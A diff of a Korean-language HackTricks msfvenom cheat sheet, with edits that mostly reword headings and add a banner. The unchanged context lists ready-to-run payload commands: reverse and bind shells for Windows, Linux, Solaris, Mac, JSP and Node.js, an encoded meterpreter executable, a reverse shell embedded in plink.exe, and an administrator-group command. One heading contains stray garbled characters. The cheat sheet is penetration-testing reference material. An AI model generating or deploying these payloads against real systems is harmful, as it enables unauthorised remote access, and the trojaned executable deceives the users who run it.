@@ -1,19 +1,21 @@
 # MSFVenom - CheatSheet
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ---
 
 ## 기본 msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-`-a`를 사용하여 payload 아키텍처를 선택하고 `--platform`을 사용하여 대상 platform을 선택합니다.<sup>[[1]](#references)</sup>
+`-a`를 사용하여 payload 아키텍처를 선택하고, `--platform`을 사용하여 대상 플랫폼을 선택합니다.<sup>[[1]](#references)</sup>
 
-## 목록
+## 목록ેણ
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-이 명령어는 설치된 framework에서 사용할 수 있는 payload 및 encoder 모듈을 나열합니다.<sup>[[1]](#references)</sup>
+이 명령어는 설치된 framework에서 사용 가능한 payload 및 encoder 모듈을 나열합니다.<sup>[[1]](#references)</sup>
 
 ## shellcode 생성 시 일반적인 매개변수
 ```bash
@@ -52,7 +54,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### 실행 파일에 내장됨
+### 실행 파일 내부에 삽입됨
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
@@ -71,7 +73,7 @@ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) 
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
-## **MAC 페이로드**
+## **MAC Payloads**
 
 ### **Reverse Shell:**
 ```bash
@@ -113,7 +115,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **스크립트 언어 payload**
+## **Script Language payloads**
 
 ### **Perl**
 ```bash
